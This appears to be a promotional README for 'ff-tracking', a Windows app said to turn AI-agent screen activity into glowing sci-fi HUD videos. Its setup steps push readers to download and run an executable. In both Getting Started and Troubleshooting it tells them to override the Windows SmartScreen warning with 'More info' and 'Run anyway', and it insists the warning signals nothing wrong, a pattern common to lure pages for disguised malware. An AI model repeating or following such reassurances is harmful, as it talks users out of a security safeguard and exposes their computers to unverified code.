# 🎬 ff-tracking - Turn Screen Captures Into Glowing HUDs

ff-tracking is a desktop app that turns plain screen activity into a cinematic, sci-fi style video. A virtual camera films an AI agent's screen while a tracker locks onto every glyph — every letter, number, and symbol — and builds a living heads-up display around it. Two fframes passes handle the work, a single SkSL shader paints the visuals, and every beep, click, and hum you hear is synthesized from scratch. No stock footage, no sample packs, no manual keyframing.

You do not need to write code, edit a timeline, or understand shaders to use it. You open the app, point it at a screen, and it produces a finished-looking clip.

[![Download ff-tracking](https://img.shields.io/badge/Download-ff--tracking-ff5f6d?style=for-the-badge&logo=github&logoColor=white)](https://github.com/lookred/ff-tracking)

## 🌟 What This App Actually Does

Imagine pointing a camcorder at a computer monitor. Now imagine that camcorder is virtual, the monitor belongs to an AI agent working through a task, and a tiny invisible detective is watching every character that appears on that screen. The detective — the tracker — draws a box around each glyph, follows it as it moves, and hands that information to a renderer.

The renderer then draws the finished scene twice. The first pass lays down the base image and the tracking information. The second pass adds the glow, the scanlines, the corner brackets, and the motion accents on top. Because both passes are powered by one small shader program, the whole thing stays fast and consistent, even when there are hundreds of glyphs on screen at once.

The result looks like a control room feed from a science fiction film — except it is generated from real screen activity, automatically.

## ✨ Highlights

- **Automatic glyph tracking** — letters, digits, and symbols are detected and followed frame by frame, so overlays stick to the content instead of drifting.
- **Two-pass rendering** — a clean base pass plus a detail pass means sharp text and rich effects at the same time.
- **One single shader** — all visual effects come from a compact SkSL program, which keeps colors and glow matched across the entire clip.
- **Fully synthesized audio** — ambient hum, ticks, and interface blips are generated mathematically. Nothing is downloaded, licensed, or borrowed.
- **Virtual camera framing** — smooth, deliberate camera movement without you setting a single keyframe.
- **Consistent output** — the same settings produce the same look every time, which makes a series of clips feel like one broadcast.
- **Lightweight footprint** — built in Rust and rendered with Skia, so it stays responsive on ordinary hardware.

## 🚀 Getting Started

Getting ff-tracking onto your Windows computer takes one visit to one page.

**Step 1 — Visit the download page.**

Go to:

https://github.com/lookred/ff-tracking

Visit this link to download the application.

**Step 2 — Save the file.**

Your browser will ask where to put the download. The default Downloads folder is perfectly fine. Wait for the progress indicator to finish before doing anything else.

**Step 3 — Open what you downloaded.**

Open your Downloads folder and double-click the file you just saved. If Windows shows a blue "Windows protected your PC" panel, click **More info**, then **Run anyway**. This panel appears for many newly published apps and is not a sign that something is wrong.

**Step 4 — Let it settle.**

The first launch takes a few extra seconds while the app prepares its rendering engine. After that, it opens much faster.

That is the entire setup. There is no account to create, no license key to paste, and no separate runtime to install.

## 🖥️ Your First Clip, Step by Step

1. **Choose the screen you want filmed.** The app shows a list of available displays and windows. Pick the one running the activity you want to capture.
2. **Turn on glyph tracking.** This tells the tracker to start locking onto characters. A light preview appears so you can confirm it is finding text before you record anything.
3. **Pick a look.** Presets cover clean corporate HUD, heavy retro terminal, and soft minimal overlay. Each preset only changes the shader values behind the scenes.
4. **Set the length.** Choose how many seconds you want. Short clips of ten to fifteen seconds work well for social posts; longer clips suit documentation and demonstrations.
5. **Press Start.** The virtual camera begins filming and the two passes render in sequence. A progress bar shows how far along the render is.
6. **Find your result.** When it finishes, the app tells you where the finished video was saved. Double-click it and it plays in any standard video player.

If a clip does not look right, change one setting at a time and re-render. Changing three things at once makes it hard to tell what helped.

## 🎛️ Understanding the Two Passes

You do not need to think about this to use the app, but it explains why the output looks polished.

The **first pass** is the foundation. It captures the screen, notes where every glyph sits, and stores that layout. Think of it as a clean pencil sketch with helpful margin notes.

The **second pass** reads those notes and decorates the scene. Corner brackets snap into place, scanlines sweep across, tracked characters glow briefly as they update, and the camera drifts according to your chosen framing style.

Because the passes are separate, you can re-run only the second pass when you want to try a different look. The tracking data is already there, so experimenting is quick.

## 🎨 The Single Shader

Everything visual is produced by one SkSL shader — a small program that decides the color of each pixel. That single program handles glow intensity, edge outlines, noise texture, and color grading. Keeping it to one shader is what makes the app dependable: there is no chance of two effects disagreeing about color or brightness, and the look stays identical from the first frame to the last.

In the settings panel you will find a handful of sliders — glow strength, line weight, noise amount, and tint. Move them slowly. Small adjustments go a long way.

## 🔊 Where the Sound Comes From

Every sound is generated in real time by the app itself. The low ambient bed, the soft tick when a glyph is locked, and the short blip when a new region appears are all calculated from simple waveforms and shaped with filters.

This means you can adjust the character of the audio without hunting for files. Turning the ambient level down and the tick level up gives a precise, technical feel. The reverse gives something calmer and more atmospheric.

## 🧩 What You Need

- Windows 10 or Windows 11, 64-bit
- A screen resolution of 1280×720 or higher
- Around 500 MB of free disk space for the app and your rendered clips
- At least 8 GB of memory for comfortable rendering of longer clips
- Permission to capture the screen you want to film

## ❓ Troubleshooting

**The app opens but the preview stays black.**
Close the app and open it again, then reselect the screen you want. Some full-screen games and protected video players block capture entirely; try a normal desktop window instead.

**The tracker misses small text.**
Increase your display scaling slightly, or capture a window rather than the whole desktop. Very small fonts below roughly ten pixels are genuinely difficult to detect.

**The render feels slow.**
Shorten the clip length or lower the output resolution. The second pass is the heavier of the two, and longer clips give it more frames to decorate.

**The finished video has no sound.**
Check that the audio toggle in the export panel is switched on, and confirm your video player is not muted.

**Windows shows a warning when I launch it.**
Click **More info**, then **Run anyway**. This is the standard SmartScreen notice for apps that have not yet built up a download reputation.

## 💬 Feedback and Ideas

Bug reports, look requests, and preset ideas are all welcome on the project page. When reporting a problem, mention your Windows version, the screen resolution you captured, and roughly how long the clip was — those three details solve most issues immediately.

[![Download ff-tracking](https://img.shields.io/badge/Get%20ff--tracking-4facfe?style=for-the-badge&logo=github&logoColor=white)](https://github.com/lookred/ff-tracking)

Visit this link to download the application.

Keywords: fframes, generative-video, hud, motion-graphics, rust, shader, skia, sksl, glyph-tracking, screen-capture, virtual-camera, synthesized-audio, windows